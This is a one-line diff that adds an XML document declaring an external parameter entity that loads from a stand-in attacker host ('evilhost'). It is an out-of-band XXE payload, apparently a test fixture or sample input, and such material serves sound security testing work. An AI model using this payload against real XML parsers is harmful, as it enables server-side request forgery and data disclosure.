@@ -1,0 +1,1 @@
+<!DOCTYPE foo [ <!ENTITY % asd SYSTEM "http://evilhost"> %asd;]>
